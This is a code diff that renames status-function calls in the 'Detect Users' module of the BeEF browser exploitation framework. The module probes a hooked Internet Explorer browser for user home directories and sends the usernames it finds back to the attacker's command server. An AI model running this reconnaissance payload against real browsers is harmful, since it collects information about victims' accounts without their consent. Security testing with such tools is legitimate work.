@@ -8,7 +8,7 @@ beef.execute(function() {
 
   if (!("ActiveXObject" in window)) {
     beef.debug('[Detect Users] Unspported browser');
-    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.status.error());
     return false;
   }
 
@@ -43,7 +43,7 @@ beef.execute(function() {
 
   if (home_dir == '') {
     beef.debug('[Detect Users] Could not find home directory');
-    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=could not find home directory', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=could not find home directory', beef.status.error());
     return false;
   }
 
@@ -64,7 +64,7 @@ beef.execute(function() {
     var result = detect_folder(home_dir + user);
     if (result) {
       beef.debug('[Detect Users] Found user: ' + user);
-      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
+      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.status.success());
     }
   }
 
@@ -83,7 +83,7 @@ beef.execute(function() {
     var result = detect_folder(home_dir + user);
     if (result) {
       beef.debug('[Detect Users] Found user: ' + user);
-      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
+      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.status.success());
     }
   }
 
@@ -96,7 +96,7 @@ beef.execute(function() {
       var result = detect_folder(home_dir + user);
       if (result) {
         beef.debug('[Detect Users] Found user: ' + user);
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.status.success());
       }
     }
   }
@@ -110,7 +110,7 @@ beef.execute(function() {
       var result = detect_folder(home_dir + user);
       if (result) {
         beef.debug('[Detect Users] Found user: ' + user);
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.status.success());
       }
     }
   }
@@ -124,7 +124,7 @@ beef.execute(function() {
       var result = detect_folder(home_dir + user);
       if (result) {
         beef.debug('[Detect Users] Found user: ' + user);
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.status.success());
       }
     }
   }
@@ -138,7 +138,7 @@ beef.execute(function() {
       var result = detect_folder(home_dir + user);
       if (result) {
         beef.debug('[Detect Users] Found user: ' + user);
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.status.success());
       }
     }
   }
